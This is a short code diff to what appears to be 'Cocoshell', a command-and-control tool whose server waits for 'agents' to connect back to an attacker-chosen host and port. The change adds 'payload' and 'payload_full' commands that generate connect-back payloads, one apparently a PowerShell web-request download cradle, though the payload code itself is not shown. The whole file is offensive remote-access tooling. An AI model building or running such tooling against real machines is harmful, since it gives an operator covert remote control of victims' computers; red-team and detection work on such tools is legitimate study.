@@ -1,6 +1,7 @@
 import argparse, uuid, sys, subprocess, time
 from core.log import Log
 from core.functions import *
+from core.payload import *
 
 parser = argparse.ArgumentParser(
     prog='Cocoshell',
@@ -27,7 +28,7 @@ request_url = 'http://' + lhost + ':' + lport
 agent_url = request_url + '/' + route
 
 logger.info(f"The agents will connect to {agent_url}")
-proc = subprocess.Popen(["python3", "core/api.py", "-r", route, "-lp", lport], stdout=None)
+proc = subprocess.Popen(["python3", "core/api.py", "-r", route, "-lp", lport, "-u", agent_url], stdout=None)
 time.sleep(0.5)
 
 try:
@@ -37,6 +38,10 @@ try:
             print_agents(request_url)
         elif command == "help":
             logger.print_general_help()
+        elif command == "payload":
+            logger.payload(generate_iwr(agent_url))
+        elif command == "payload_full":
+            logger.payload(generate_payload(agent_url))
         elif command == "exit":
             raise SystemExit
         elif "remove" in command:
